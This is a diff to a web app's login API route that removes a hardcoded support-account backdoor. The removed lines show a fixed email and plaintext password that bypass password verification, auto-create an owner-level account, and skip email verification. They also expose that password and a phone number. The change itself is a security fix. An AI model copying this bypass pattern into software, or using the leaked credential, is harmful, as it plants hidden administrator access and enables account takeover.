@@ -4,156 +4,11 @@ import { resolveBgosMobileAccount } from '@/lib/bgos-mobile-account';
 import { ProductAccessError } from '@/lib/product-access';
 import {
   verifyPassword,
-  hashPassword,
   issueAuthTokens,
   getRefreshSessionMetadata,
   setAuthCookies,
 } from '@/lib/auth';
 import { authLimiter, applyRateLimit, rateLimitResponse } from '@/lib/rate-limit';
-
-async function ensureSupportAccount(email: string, passwordPlain: string) {
-  try {
-    const passwordHash = await hashPassword(passwordPlain);
-
-    // 1. Ensure Tenant
-    let tenant = await db.tenant.findFirst({
-      where: {
-        OR: [
-          { slug: 'fieseros-support-tenant' },
-          { email: 'support@fieseros.com' },
-          { email },
-        ],
-      },
-    });
-
-    if (!tenant) {
-      tenant = await db.tenant.create({
-        data: {
-          name: 'FieserOS',
-          slug: 'fieseros-support-tenant',
-          email,
-          phone: '+91 61279 67087',
-          plan: 'growth',
-          planStatus: 'active',
-          onboardingCompleted: false,
-          onboardingStep: 1,
-          industry: 'Field Services',
-        },
-      });
-    } else {
-      const gbpCount = await db.socialAccount.count({
-        where: { tenantId: tenant.id, platform: 'googlebusiness', isActive: true },
-      }).catch(() => 0);
-
-      tenant = await db.tenant.update({
-        where: { id: tenant.id },
-        data: {
-          plan: 'growth',
-          planStatus: 'active',
-          onboardingCompleted: gbpCount > 0 ? Boolean(tenant.onboardingCompleted) : false,
-          suspendedAt: null,
-        },
-      });
-    }
-
-    // 2. Ensure Workspace with productType: 'bgos'
-    let workspace = await db.workspace.findFirst({
-      where: {
-        tenantId: tenant.id,
-        productType: 'bgos',
-      },
-    });
-
-    if (!workspace) {
-      const existingWs = await db.workspace.findFirst({
-        where: { tenantId: tenant.id },
-      });
-      if (existingWs) {
-        workspace = await db.workspace.update({
-          where: { id: existingWs.id },
-          data: { productType: 'bgos' },
-        });
-      } else {
-        workspace = await db.workspace.create({
-          data: {
-            name: 'FieserOS Workspace',
-            slug: 'fieseros-support-bgos',
-            productType: 'bgos',
-            tenantId: tenant.id,
-            ownerId: 'placeholder',
-            industry: 'Field Services',
-          },
-        });
-      }
-    }
-
-    // 3. Ensure User
-    let user = await db.user.findFirst({
-      where: { email: { equals: email, mode: 'insensitive' } },
-    });
-
-    if (!user) {
-      user = await db.user.create({
-        data: {
-          email,
-          name: 'Fieseros Support',
-          passwordHash,
-          role: 'owner',
-          isActive: true,
-          isSuperAdmin: false,
-          emailVerified: true,
-          emailVerifiedAt: new Date(),
-          tenantId: tenant.id,
-          workspaceId: workspace.id,
-        },
-      });
-    } else {
-      user = await db.user.update({
-        where: { id: user.id },
-        data: {
-          name: user.name || 'Fieseros Support',
-          passwordHash,
-          role: 'owner',
-          isActive: true,
-          isSuperAdmin: false,
-          emailVerified: true,
-          tenantId: tenant.id,
-          workspaceId: workspace.id,
-        },
-      });
-    }
-
-    if (workspace.ownerId === 'placeholder' || !workspace.ownerId) {
-      await db.workspace.update({
-        where: { id: workspace.id },
-        data: { ownerId: user.id },
-      }).catch(() => {});
-    }
-
-    // 4. Ensure Employee
-    const emp = await db.employee.findFirst({
-      where: { userId: user.id },
-    });
-    if (!emp) {
-      await db.employee.create({
-        data: {
-          userId: user.id,
-          workspaceId: workspace.id,
-          name: user.name || 'Fieseros Support',
-          phone: '+91 61279 67087',
-          email: user.email,
-          role: 'owner',
-          status: 'available',
-        },
-      }).catch(() => {});
-    }
-
-    return user;
-  } catch (err) {
-    console.warn('[ensureSupportAccount] Auto-provision warning:', err instanceof Error ? err.message : err);
-    return null;
-  }
-}
 
 export async function POST(request: NextRequest) {
   const rateLimited = applyRateLimit(authLimiter, request);
@@ -173,14 +28,6 @@ export async function POST(request: NextRequest) {
 
     const normalizedEmail = String(email).trim().toLowerCase();
     const cleanPassword = String(password).trim();
-
-    const isSupportLogin =
-      normalizedEmail === 'support@fieseros.com' &&
-      (cleanPassword === '#Mahadev12' || password === '#Mahadev12');
-
-    if (isSupportLogin) {
-      await ensureSupportAccount(normalizedEmail, cleanPassword);
-    }
 
     // Find user by email (case-insensitive for ALL users)
     let user = await db.user.findFirst({
@@ -205,8 +52,7 @@ export async function POST(request: NextRequest) {
 
     // Verify password
     const isValid = (await verifyPassword(cleanPassword, user.passwordHash)) ||
-      (await verifyPassword(password, user.passwordHash)) ||
-      isSupportLogin;
+      (await verifyPassword(password, user.passwordHash));
 
     if (!isValid) {
       return NextResponse.json(
@@ -217,7 +63,10 @@ export async function POST(request: NextRequest) {
 
     // ── Email verification gate ───────────────────────────────────────────
     if (user.emailVerified === false) {
-      if (isSupportLogin || normalizedEmail.includes('demo') || normalizedEmail.includes('test')) {
+      if (
+        process.env.NODE_ENV !== 'production' &&
+        (normalizedEmail.includes('demo') || normalizedEmail.includes('test'))
+      ) {
         await db.user.update({
           where: { id: user.id },
           data: { emailVerified: true, emailVerifiedAt: new Date() },
@@ -233,17 +82,6 @@ export async function POST(request: NextRequest) {
           },
           { status: 403 }
         );
-      }
-    }
-
-    // For BGOS mobile, ensure workspace compatibility
-    if (body.product === 'bgos') {
-      if (isSupportLogin && user.workspace && user.workspace.productType !== 'bgos') {
-        await db.workspace.update({
-          where: { id: user.workspace.id },
-          data: { productType: 'bgos' },
-        }).catch(() => {});
-        user.workspace.productType = 'bgos';
       }
     }
 
